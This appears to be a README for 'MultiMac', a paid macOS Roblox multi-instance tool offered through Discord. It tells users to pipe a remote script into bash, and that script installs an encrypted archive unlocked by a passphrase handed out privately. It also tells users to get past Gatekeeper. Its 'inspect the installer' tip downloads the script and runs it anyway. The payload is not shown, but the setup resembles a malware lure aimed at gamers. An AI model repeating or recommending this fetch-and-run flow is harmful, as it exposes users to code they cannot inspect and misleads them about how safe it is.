Quick install (macOS)
MultiMac Is An App that allows you to run more than 1 roblox at a time it has a 24 hour demo key you get from seller/support (RenzRbx on discord - Its free) Not only can you run multi instances but it has other things you can do like fps unlocker performance monitor storage tools for roblox and your main mac and manager your roblox instances.

One‑line installer (downloads an encrypted package and installs MultiMac Demo.app into Applications):

curl -fsSL https://raw.githubusercontent.com/RenzRBX/multimac-demo-private/main/encrypted_release/install-multimac.sh | bash

During install you’ll be prompted for a decryption passphrase. Obtain it from the seller/support before running the command. (Get from me at Discord user: RenzRbx - Dms open)

What the installer does

Downloads the encrypted release from this repository (encrypted_release/multimac-demo.tar.gz.enc).
Prompts for the passphrase, decrypts and unpacks the app bundle.
Installs MultiMac Demo.app into /Applications.
Creates a working folder at ~/MultiMac-Demo (virtualenv, logs, config).
Launch the app

Finder: open /Applications/MultiMac Demo.app
Or via Python launch (if you prefer CLI): cd ~/MultiMac-Demo source venv/bin/activate python3 main.py

--- Optional Stuff Down Here ---
Verify integrity (optional)

View the installer script (should be human-readable bash): curl -fsSL https://raw.githubusercontent.com/RenzRBX/multimac-demo-private/main/encrypted_release/install-multimac.sh
Verify archive checksum: curl -fsSL https://raw.githubusercontent.com/RenzRBX/multimac-demo-private/main/encrypted_release/checksums.txt shasum -a 256 "/tmp/multimac-demo.enc" # compare if you saved the file locally
The archive is encrypted (cannot be inspected) until you provide the passphrase.

--- Unistallation ---
Remove app: sudo rm -rf "/Applications/MultiMac Demo.app"
Remove working folder: rm -rf "$HOME/MultiMac-Demo"
Remove local cached config/keys (optional): rm -f "$HOME/.multimac_keys.dat" "$HOME/.multimac_config.dat" "$HOME/.multimac_instances.lock"

--- Troubleshooting ---

“Could not resolve host”: check your internet/DNS or retry (GitHub raw can briefly cache updates for ~5 minutes).
“Decryption failed”: incorrect passphrase. Request the correct passphrase and try again.
macOS blocks the app: right click “MultiMac Demo.app” > Open (first run) to whitelist via Gatekeeper.
If you want to inspect the installer before running: curl -fsSL https://raw.githubusercontent.com/RenzRBX/multimac-demo-private/main/encrypted_release/install-multimac.sh -o install.sh bash install.sh
Security notes

The application archive is AES‑256‑CBC encrypted. The passphrase is required to decrypt during install.
Never publish the passphrase in public materials (README, website, posts). Share it privately with customers.
For support

Open an issue on this repository or contact support with your environment (macOS version and Apple Silicon/Intel).
